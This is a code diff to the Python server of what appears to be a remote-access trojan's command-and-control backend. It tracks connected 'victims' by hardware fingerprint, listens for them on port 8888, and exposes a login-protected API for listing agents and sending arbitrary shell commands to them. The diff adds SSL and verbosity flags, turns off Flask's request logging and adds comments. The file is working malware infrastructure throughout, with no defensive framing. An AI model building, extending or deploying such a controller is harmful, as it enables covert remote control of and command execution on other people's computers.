@@ -8,6 +8,8 @@ import threading
 import time
 import socket
 import select
+import argparse
+import logging
 
 from flask import Flask, request, jsonify
 from dataclasses import dataclass
@@ -16,13 +18,22 @@ from lib import api
 from lib.api import HTTP_SESSION
 from lib.crypto import EncryptedTunnel, get_hwid
 
+"""
+TODO: create lib/logging.py & apply logging in main.py 
+"""
+
+# ----> [ CLI parsing ] <----
+
+parser = argparse.ArgumentParser()
+parser.add_argument("--ssl", action="store_true", help="Enable HTTPS")
+parser.add_argument("-v", "--verbose", action="store_true")
+
+# Init variable
+
 current_dir = "/".join(__file__.split("/")[:-1])
-config = tomllib.load(
-    open(current_dir + "/config/config.toml", "rb")
-)
+config = tomllib.load(open(current_dir + "/config/config.toml", "rb"))
 
 app_api = Flask(__name__)
-https_files = (current_dir + "/config/website.crt", current_dir + "/config/private.key")
 http_session = HTTP_SESSION()
 whitelist_users = config.get("whitelist")
 
@@ -33,15 +44,16 @@ if whitelist_users is None:
 class ServerConfig:
     FINGERPRINT = hashlib.sha256((hex(uuid.getnode()) + get_hwid()).encode()).hexdigest()
     BUFSIZE: int
-    # {addr: [fingerprint, pc_name, EncryptedTunnel]}
-    VICTIMS: dict
+    VICTIMS: dict # {addr: [fingerprint, pc_name, EncryptedTunnel]}
 
 servercfg = ServerConfig(1024, {})
 
-# TODO: secure https (ssl)
 # TODO: client management
 
 def server_api(host: str, port: int, debug: bool, ssl_context: tuple):
+   
+    # >>> [ACCESS] <<<
+    
     @app_api.route("/access", methods=["POST"])
     async def access():
         json_req: dict = request.get_json()
@@ -49,45 +61,65 @@ def server_api(host: str, port: int, debug: bool, ssl_context: tuple):
         password: str = json_req["password"]
 
         if username in whitelist_users:
+
+            # Check password with the whitelist
             if password == hashlib.sha256(whitelist_users[username].encode()).hexdigest():
+                # Generate & add session
                 session = http_session.add_session(request.remote_addr)
+            
             else:
                 return jsonify({"error": "Username of password invalid"}), 401
+    
         else:
             return jsonify({"error": "Username or password invalid"}), 401
 
         return jsonify({"session": session[1]})
+
+     # >>> [GET_AGENTS] <<<
     
     @app_api.route("/get_agents/<session>")
     async def send_agents(session):
+
+        # Check IF exist session
         if http_session.check(request.remote_addr, session):
+            
+            # Add agents fingerprint into `agents_fingerprint`
             agents_fingerprint = []
             for v in servercfg.VICTIMS:
                 agents_fingerprint.append(servercfg.VICTIMS[v][0].decode())
 
             return jsonify({"fingerprints": agents_fingerprint})
+        
         else:
             return jsonify({"error": "Invalid session"})
+
+    # >>> [ SEND_COMMAND ] <<<
 
     @app_api.route("/send_command", methods=["POST"])
     async def agent_command():
         json_req: dict = request.get_json()
-        fingerprint = json_req["fingerprint"]
+        fingerprint = json_req["fingerprint"] # Agent fingerprint
         command = json_req["command"]
 
+        # Get addr:port by agent fingerprint
         key_agent = api.get_tunnel_by_fingerprint(servercfg.VICTIMS, fingerprint)
+        
         if key_agent is None:
             return jsonify({"error": "This agent don't exist"}), 403
+        
         else:
             s: EncryptedTunnel = servercfg.VICTIMS[key_agent][2]
             try:
-                # TODO: do better
+                # TODO: do better  -> set recv dynamic bufsize
                 s.send(command)
+             
                 return jsonify({"output": await s.recv(servercfg.BUFSIZE).decode()})
             
             except Exception as e:
                 return jsonify({"error": str(e)}), 408
             
+    # --- [ Start HTTP(s) server ] ---
+
     if len(ssl_context) > 0:
         app_api.run(host, port, debug, ssl_context = ssl_context)
     else:
@@ -138,13 +170,23 @@ async def handle_victims(r: asyncio.streams.StreamReader, w: asyncio.streams.Str
             break
 
 async def main():
+    args = parser.parse_args()
+
+    # Disable Flask printing
+    logging.getLogger("werkzeug").disabled = True
+
     # Open multiple server
     server_victims = await asyncio.start_server(handle_victims, '0.0.0.0', 8888)
+    if not args.ssl:
+        https_files = ()
+    else:
+        https_files = (current_dir + "/config/website.crt", current_dir + "/config/private.key")
+
     threading.Thread(target=server_api, args=('127.0.0.1', 6666, False, https_files)).start()
 
     # Looping server
     async with server_victims:
         await server_victims.serve_forever()
-    
+
 if __name__ == "__main__":
     asyncio.run(main())
